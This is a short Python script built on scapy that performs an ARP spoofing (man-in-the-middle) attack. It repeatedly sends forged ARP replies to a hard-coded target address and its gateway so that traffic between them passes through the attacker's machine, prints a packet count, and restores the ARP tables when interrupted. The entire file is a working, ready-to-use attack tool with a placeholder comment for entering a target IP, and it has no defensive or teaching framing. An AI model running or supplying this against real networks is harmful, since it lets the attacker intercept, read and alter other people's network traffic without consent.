import scapy.all as scapy
import time

def macFinder(ip):
	arpReq = scapy.ARP(pdst = ip)
	broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
	arpReq_broadcast = broadcast / arpReq
	answered_list = scapy.srp(arpReq_broadcast, timeout = 5, verbose = False)[0]
	return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
	packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = macFinder(target_ip),
															psrc = spoof_ip)
	scapy.send(packet, verbose = False)


def restore(destination_ip, source_ip):
	macDest = macFinder(destination_ip)
	source_mac = macFinder(source_ip)
	packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = macDest, psrc = source_ip, hwsrc = source_mac)
	scapy.send(packet, verbose = False)
	

target_ip = "192.168.8.135" # Enter your target IP
gateway_ip = "192.168.8.1" # Enter your gateway's IP

try:
	sent_packets_count = 0
	while True:
		spoof(target_ip, gateway_ip)
		spoof(gateway_ip, target_ip)
		sent_packets_count = sent_packets_count + 2
		print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
		time.sleep(2) # Waits for two seconds

except KeyboardInterrupt:
	print("\nCtrl + C pressed.............Exiting")
	restore(gateway_ip, target_ip)
	restore(target_ip, gateway_ip)
	print("[+] Arp Spoof Stopped")
